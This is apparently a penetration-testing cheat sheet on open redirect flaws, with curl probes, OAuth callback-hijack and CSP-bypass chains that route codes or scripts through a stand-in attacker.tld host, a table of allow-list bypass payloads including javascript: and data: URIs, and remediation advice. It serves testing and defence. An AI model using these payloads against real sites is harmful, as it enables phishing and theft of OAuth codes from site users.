# Open Redirect

> Application redirects the user to an attacker-controlled URL based on user input. Low impact alone, high impact as a chain ingredient (OAuth callback hijack, phishing, SSRF probe, CSP bypass). Authorized testing only. Map: WSTG-CLNT-04, CWE-601.

## TL;DR
- Sinks: `Location` header (`302`), JavaScript `window.location = …`, meta refresh, framework `redirect()` helper.
- Common parameter names: `next`, `url`, `redirect`, `redirect_uri`, `r`, `dest`, `destination`, `return`, `returnTo`, `continue`, `back`.
- Bypasses target parser quirks: scheme-relative URLs, `@` user-info, backslash, IPv6, decimal/hex IP, control characters.
- Defence: validate against a host allow-list (parse with the host's URL parser, compare resolved host).

## Detection / Discovery
```bash
# Smoke probes
curl -i "https://target/login?next=https://attacker.tld/"
curl -i "https://target/?return=//attacker.tld"
curl -i "https://target/?next=javascript:alert(1)"    # JS context — XSS via open-redirect
```
Look for `Location: https://attacker.tld/` or `https://target/path?…attacker.tld` in the response.

## Exploitation

### Direct
```
https://target/login?next=https://attacker.tld/
```

### OAuth callback hijack (high impact)
See [./oauth-saml.md](./oauth-saml.md). If the IdP/SP's `redirect_uri` allow-list does substring match, attacker uses an open-redirect on the *legitimate* host to bounce the `code` to themselves:
```
?redirect_uri=https://target/openredir?next=https://attacker.tld
```

### CSP bypass via reflected redirect on same origin
If CSP allows `target.tld` but you have an open redirect on `target.tld/r?dest=...`, you can host a script-tag that loads `target.tld/r?dest=https://attacker/x.js` — bypasses script-src for some setups (rare; depends on CSP-source matching).

### Phishing — server-trust laundering
`https://target.tld/click?next=https://attacker.tld` — link looks legit (target's domain), but lands on the attacker page. Heavily abused in email phishing.

## Bypasses (against weak allow-lists)
| Bypass | Notes |
| --- | --- |
| `//attacker.tld` | Scheme-relative; the browser uses the page's scheme. |
| `///attacker.tld` | Same; some parsers strip an extra slash. |
| `https://target.tld@attacker.tld/` | `target.tld@` is user-info; the host is `attacker.tld`. |
| `https://target.tld%2eattacker.tld/` | Encoded dot. Parser may decode after allow-list check. |
| `https://target.tld%252eattacker.tld/` | Double encoding. |
| `https://attacker.tld#target.tld/` | If the check is `endsWith('target.tld')`. |
| `https://attacker.tld/target.tld/` | If the check is `contains('target.tld')`. |
| `https://target.tld.attacker.tld/` | Subdomain spoof. |
| `\\attacker.tld` / `\/\/attacker.tld` | Backslash; browser-specific normalisation. |
| `https://0x7f000001/` `https://2130706433/` | Decimal / hex IP — some validators miss. |
| `https://[::ffff:127.0.0.1]/` | IPv6-mapped IPv4. |
| `javascript:alert(1)` | If the redirect sink is `<a href>` or `window.location`. |
| `data:text/html,<script>…</script>` | Some redirect sinks accept data: URIs. |

## Defence / Remediation
- **Allow-list of hosts** that the redirect is allowed to target. Parse with the platform's URL parser, extract `.hostname`, compare exact-string to the allow-list. Reject everything else.
- **Or** redirect through a non-user-controllable map (`?id=42` → server looks up the URL).
- **Reject schemes** other than `http`/`https` for any redirect built from user input — explicit deny on `javascript:`, `data:`, `vbscript:`, `file:`.
- **Confirmation interstitial** for off-origin redirects ("You are leaving target.tld. Continue?") — UX-friendly defence; doesn't help OAuth chains though.
- **Strict OAuth `redirect_uri` allow-list** (exact match, no substring).
- CWE-601 URL Redirection to Untrusted Site.

## Sources
- OWASP WSTG-CLNT-04 Testing for Client-side URL Redirect: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect
- OWASP Cheat Sheet — Unvalidated Redirects and Forwards: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
- PortSwigger — Open redirection: https://portswigger.net/kb/issues/00500100_open-redirection-reflected
- PayloadsAllTheThings Open Redirect: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
- HackTricks Open Redirect: https://book.hacktricks.wiki/en/pentesting-web/open-redirect.html
- CWE-601: https://cwe.mitre.org/data/definitions/601.html
